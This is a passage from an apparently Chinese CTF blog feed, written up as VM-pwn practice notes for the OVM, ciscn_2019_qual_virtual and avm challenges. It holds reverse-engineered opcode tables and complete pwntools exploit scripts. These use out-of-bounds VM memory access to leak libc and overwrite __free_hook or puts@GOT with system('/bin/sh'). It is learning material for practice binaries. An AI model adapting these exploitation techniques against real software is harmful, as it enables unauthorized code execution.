aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;那些画像之所以具有如此的魅力，正是因为这些纯粹只是画像而已，它们并不是真实的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人生经验的首要任务，就是要摆脱那些在我们青春期扎根头脑的幻想和虚假概念&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>VMpwn练习</title>
      <link>http://localhost:1313/posts/vmpwn/</link>
      <pubDate>Thu, 23 Oct 2025 23:27:58 +0800</pubDate>
      <guid>http://localhost:1313/posts/vmpwn/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;ogeek2019-finalovm&#34;&gt;&lt;span&gt;[OGeek2019 Final]OVM&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ogeek2019-finalovm&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;buuctf的一道题&lt;/p&gt;&#xA;&lt;p&gt;docker pull roderickchan/debug_pwn_env:16.04-2.23-0ubuntu11.3-20240412&lt;/p&gt;&#xA;&lt;p&gt;先输入&lt;code&gt;pc&lt;/code&gt;、&lt;code&gt;sp&lt;/code&gt;、&lt;code&gt;code size&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;pc：将指令写入memory的偏移，置0就行&lt;/li&gt;&#xA;&lt;li&gt;sp：push、pop指令写入栈的偏移，置0就行&lt;/li&gt;&#xA;&lt;li&gt;code size：增加一条opcode，opcode size就要加1&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;vm指令：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;0x10：mov reg[high]，low&lt;/li&gt;&#xA;&lt;li&gt;0x20：mov reg[high]，0&lt;/li&gt;&#xA;&lt;li&gt;0x30：mov reg[high]，memory[reg[low]]&lt;/li&gt;&#xA;&lt;li&gt;0x40：mov memory[reg[low]]，reg[high]&lt;/li&gt;&#xA;&lt;li&gt;0x50：PUSH：push reg[high] ，sp++&lt;/li&gt;&#xA;&lt;li&gt;0x60：POP： pop[high]，sp&amp;ndash;&lt;/li&gt;&#xA;&lt;li&gt;0x70：ADD： reg[high] = reg[low] + reg[medium]&lt;/li&gt;&#xA;&lt;li&gt;0x80：SUB：reg[high] = reg[medium] - reg[low]&lt;/li&gt;&#xA;&lt;li&gt;0x90：AND： reg[high] = reg[low] &amp;amp; reg[medium]&lt;/li&gt;&#xA;&lt;li&gt;0xa0：OR：reg[high] = reg[low] | reg[medium]&lt;/li&gt;&#xA;&lt;li&gt;0xb0：XOR：reg[high] = reg[low] ^ reg[medium]&lt;/li&gt;&#xA;&lt;li&gt;0xc0：SHL：reg[high] = reg[medium] &amp;laquo; reg[low]&lt;/li&gt;&#xA;&lt;li&gt;0xd0：SHR：reg[high] = reg[medium] &amp;raquo; reg[low]&lt;/li&gt;&#xA;&lt;li&gt;0xe0：EXIT：停止执行&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;思路&#34;&gt;&lt;span&gt;思路&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%80%9d%e8%b7%af&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;可以往memory[]中写入负数偏移，指向got表中的stderr_ptr，再根据偏移找到free_hook，让comment指向free_hook-0x8,往free_hook-0x8开始的数据写入&lt;code&gt;b&#39;/bin/sh\x00&#39;+p64(sys_addr)&lt;/code&gt;,这样free(comment)，就是system(&amp;quot;/bin/sh&amp;quot;)&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;（拿了别的师傅的exp）&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(str(delim), data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    sbase 0x202060&#xA;    sbase 0x202460&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;node5.buuoj.cn&amp;#34;,29198 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;&#xA;#def opcode(op,high,medium,low):&#xA;#    pl = (op &amp;lt;&amp;lt; 24) &amp;#43; (high &amp;lt;&amp;lt; 16) &amp;#43; (medium &amp;lt;&amp;lt; 8) &amp;#43; (low)&#xA;#    print(&amp;#34;---&amp;gt;&amp;#34;,hex(pl))&#xA;#    sl(str(pl))&#xA;&#xA;&#xA;#sla(b&amp;#34;PC: &amp;#34;,str(0))&#xA;#sla(b&amp;#34;SP: &amp;#34;,str(1))&#xA;#sla(b&amp;#34;CODE SIZE: &amp;#34;,str(4))&#xA;#ru(b&amp;#34;CODE: &amp;#34;)&#xA;&#xA;##create a stderr address in reg array&#xA;#opcode(0x10,0,0,26)     #mov reg[0],26&#xA;#opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]&#xA;#opcode(0x30,4,0,2)      #mov reg[4],memory[reg[2]]&#xA;&#xA;class VM:&#xA;    def __init__(self):&#xA;        self.instructions = []&#xA;    &#xA;    def opcode(self, op, high, medium, low):&#xA;        self.instructions.append((op &amp;lt;&amp;lt; 24) | (high &amp;lt;&amp;lt; 16) | (medium &amp;lt;&amp;lt; 8) | low)&#xA;    &#xA;    def send_all(self):&#xA;        sla(b&amp;#34;PC: &amp;#34;, &amp;#34;0&amp;#34;)&#xA;        sla(b&amp;#34;SP: &amp;#34;, &amp;#34;0&amp;#34;)&#xA;        sla(b&amp;#34;CODE SIZE: &amp;#34;, str(len(self.instructions)))&#xA;        ru(b&amp;#34;CODE: &amp;#34;)&#xA;        for instr in self.instructions:&#xA;            sl(str(instr))&#xA;&#xA;# - 0x10：mov reg[high]，low&#xA;# - 0x20：mov reg[high]，0&#xA;# - 0x30：mov reg[high]，memory[reg[low]]&#xA;# - 0x40：mov memory[reg[low]]，reg[high]&#xA;# - 0x50：PUSH：push reg[high] ，sp&amp;#43;&amp;#43;&#xA;# - 0x60：POP： pop[high]，sp--&#xA;# - 0x70：ADD： reg[high] = reg[low] &amp;#43; reg[medium]&#xA;# - 0x80：SUB：reg[high] = reg[medium] - reg[low]&#xA;# - 0x90：AND： reg[high] = reg[low] &amp;amp; reg[medium]&#xA;# - 0xa0：OR：reg[high] = reg[low] | reg[medium]&#xA;# - 0xb0：XOR：reg[high] = reg[low] ^ reg[medium]&#xA;# - 0xc0：SHL：reg[high] = reg[medium] &amp;lt;&amp;lt; reg[low]&#xA;# - 0xd0：SHR：reg[high] = reg[medium] &amp;gt;&amp;gt; reg[low]&#xA;# - 0xe0：EXIT：停止执行&#xA;&#xA;# 使用示例&#xA;vm = VM()&#xA;#create a stderr address in reg array&#xA;#负数偏移指向stderr&#xA;vm.opcode(0x10, 0, 0, 26)   #mov reg[0], 26 &#xA;vm.opcode(0x80, 2, 1, 0)    #reg[2] = reg[1]-reg[0] = FFFFFFE6&#xA;vm.opcode(0x30, 4, 0, 2)    #mov reg[4],memory[reg[2]]&#xA;vm.opcode(0x10,0,0,25)     #mov reg[0],25&#xA;vm.opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]&#xA;vm.opcode(0x30,5,0,2)      #mov reg[5],memory[reg[2]]  reg[4][5]---&amp;gt;stderr address&#xA;&#xA;# create free_hook address through stderr address&#xA;# stderr &amp;#43; 0x10a0 = free_hook - 0x8&#xA;vm.opcode(0x10,2,0,0x10)     #mov reg[2],0x10&#xA;vm.opcode(0x10,0,0,8)      #mov reg[0],8&#xA;vm.opcode(0xc0,1,2,0)      #reg[1]=sal reg[2],8&#xA;&#xA;vm.opcode(0x10,2,0,0xa0)   #mov reg[2],0xa0&#xA;vm.opcode(0x70,1,1,2)      #add reg[1],reg[2]&#xA;vm.opcode(0x70,4,4,1)      #add reg[4],reg[1]    reg[4][5]---&amp;gt;free_hook address-8&#xA;&#xA;# let pointer comment point to free_hook&#xA;vm.opcode(0x10,0,0,0x8)     #mov reg[0],8&#xA;vm.opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0] = FFFFFFF8&#xA;vm.opcode(0x40,4,0,2)      #mov memory[reg[2]],reg[4]&#xA;vm.opcode(0x10,0,0,0x7)     #mov reg[0],9&#xA;vm.opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0]&#xA;vm.opcode(0x40,5,0,2)      #mov memory[reg[2]],reg[5]&#xA;vm.send_all()&#xA;&#xA;p.recvuntil(&amp;#34;R4: &amp;#34;)&#xA;addr1=int(p.recv(8),16)&#xA;p.recvuntil(&amp;#34;R5: &amp;#34;)&#xA;addr2=int(p.recv(4),16)&#xA;sys_addr=addr1&amp;#43;((addr2)&amp;lt;&amp;lt;32)-0x381410&#xA;lg(&amp;#34;sys_addr&amp;#34;)&#xA;# dbg()&#xA;p.sendafter(&amp;#34;HOW DO YOU FEEL AT OVM?\n&amp;#34;,b&amp;#39;/bin/sh\x00&amp;#39;&amp;#43;p64(sys_addr))&#xA;&#xA;&#xA;itr()&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;ciscn_2019_qual_virtual&#34;&gt;&lt;span&gt;ciscn_2019_qual_virtual&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ciscn_2019_qual_virtual&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;先分配几个堆块&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;  s = malloc(0x20u);                            // name&#xA;  data = alloc(0x40);&#xA;  text = alloc(0x80);&#xA;  stack = alloc(0x40);&#xA;  ptr = malloc(0x400u);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输入数据，将指令转成opcode，数据写入data&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;  puts(&amp;#34;Your program name:&amp;#34;);&#xA;  input(s, 32);&#xA;  puts(&amp;#34;Your instruction:&amp;#34;);&#xA;  input(ptr, 0x400);&#xA;  get_opcode_numnber(text, ptr);&#xA;  puts(&amp;#34;Your stack data:&amp;#34;);&#xA;  input(ptr, 0x400);&#xA;  get_data(data, ptr);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;交互方式大致为：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sla(b&amp;#39;name:\n&amp;#39;,b&amp;#39;j4f&amp;#39;)&#xA;sla(b&amp;#39;instruction:\n&amp;#39;,b&amp;#39;push push push add pop&amp;#39;)&#xA;sla(b&amp;#39;stack data:\n&amp;#39;,b&amp;#39;2 4 6&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;指令：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;push: push数据，后push的在伪造stack的高地址&#xA;pop：stack高地址的数据，给data的低地址&#xA;add: stack两个高地址的数据相加，存在stack次高地址处&#xA;sub：stack两个高地址的数据相减(高地址减次高地址)，存在stack次高地址处&#xA;mul: stack两个高地址的数据相乘，存在stack次高地址处&#xA;div: stack两个高地址的数据相除，存在stack次高地址处&#xA;load: 往stack_data &amp;#43; flag &amp;#43; 偏移处，写入基于stack_data某偏移内容&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;load指令：&lt;/p&gt;&#xA;&lt;p&gt;存数据到栈顶&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// load&#xA;__int64 __fastcall sub_401CCE(alloc_heap *stack, __int64 data)&#xA;{&#xA;  __int64 v3; // [rsp&amp;#43;10h] [rbp-10h] BYREF&#xA;&#xA;  if ( (unsigned int)give_v1_2_v2(stack, &amp;amp;v3) ) //这里会把flag-1&#xA;    return give_v2_2_V1(stack, *((_QWORD *)stack-&amp;gt;data_ptr &amp;#43; stack-&amp;gt;flag &amp;#43; v3)); //这里flag&amp;#43;1&#xA;  else&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把&lt;code&gt;*((_QWORD *)stack-&amp;gt;data_ptr + stack-&amp;gt;flag + v3))&lt;/code&gt;的值给栈顶&lt;/p&gt;&#xA;&lt;p&gt;注意flag - 1&lt;/p&gt;&#xA;&lt;p&gt;save指令：&lt;/p&gt;&#xA;&lt;p&gt;写数据到&lt;code&gt;*((_QWORD *)stack-&amp;gt;data_ptr + stack-&amp;gt;flag + v3)&lt;/code&gt;中&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// save&#xA;__int64 __fastcall sub_401D37(alloc_heap *stack, __int64 data)&#xA;{&#xA;  __int64 v3; // [rsp&amp;#43;10h] [rbp-10h] BYREF&#xA;  __int64 v4; // [rsp&amp;#43;18h] [rbp-8h] BYREF&#xA;&#xA;  if ( !(unsigned int)give_v1_2_v2(stack, &amp;amp;v3) || !(unsigned int)give_v1_2_v2(stack, &amp;amp;v4) ) //注意这里会把flag -2 &#xA;    return 0;&#xA;  *((_QWORD *)stack-&amp;gt;data_ptr &amp;#43; stack-&amp;gt;flag &amp;#43; v3) = v4;&#xA;  return 1;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先push的是v4&lt;/p&gt;&#xA;&lt;p&gt;注意flag -2&lt;/p&gt;&#xA;&lt;p&gt;execute完之后，会&lt;code&gt;puts(s);&lt;/code&gt;，这里把puts_got改成system，s写入/bin/sh&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp-1&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp-1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(str(delim), data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    b *0x401332&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;node5.buuoj.cn&amp;#34;,29332 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    # gdb.attach(p)&#xA;    gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;# data 0x200&#xA;# text  0x400&#xA;# stack 0x200&#xA;# instruction 0x400&#xA;&#xA;p.sendlineafter(&amp;#34;Your program name:\n&amp;#34;,&amp;#34;/bin/sh\x00&amp;#34;)&#xA;p.sendlineafter(&amp;#34;Your instruction:\n&amp;#34;,&amp;#34;push push save push load push add push save&amp;#34;)&#xA;p.sendlineafter(&amp;#34;Your stack data:\n&amp;#34;,&amp;#34;4210896 -3 -21 -172800 -21&amp;#34;)&#xA;&#xA;&#xA;itr()&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;长城杯pwnavm&#34;&gt;&lt;span&gt;长城杯pwn&amp;mdash;avm&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%95%bf%e5%9f%8e%e6%9d%afpwnavm&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;文章及附件：https://bbs.kanxue.com/thread-284826.htm&lt;/p&gt;&#xA;&lt;p&gt;这里我直接拿我本地的libc做了&lt;/p&gt;&#xA;&lt;p&gt;vm结构体&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct vm_struct&#xA;{&#xA;  _QWORD reg[32];&#xA;  _QWORD rip;&#xA;  _QWORD opcode;&#xA;  _QWORD num;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;交互：&lt;/p&gt;&#xA;&lt;p&gt;一条指令32个bit，最高4个bit作为instruction，0-4、5-9、16-20作为low,medium,high&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;def op(opcode,high,medium,low):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (high&amp;amp;0x1f)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (low&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;def add(high,medium,low):&#xA;    ret op(1,high,medium,low)&#xA;&#xA;def load(offset,medium,src,opcode=9):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (offset&amp;amp;0xfff)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (src&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;def store(offset,medium,dest,opcode=10):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (offset&amp;amp;0xfff)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (dest&amp;amp;0x1f))&#xA;    return ope&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;指令:&lt;/p&gt;&#xA;&lt;p&gt;4个字节一个指令&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add: low = high &amp;#43; medium&#xA;sub: low = medium - high&#xA;mul: low = high*medium&#xA;div: low = medium/high&#xA;xor: low = high^medium&#xA;and: low = high&amp;amp;medium&#xA;shl: low = medium&amp;lt;&amp;lt;high&#xA;shr: low = 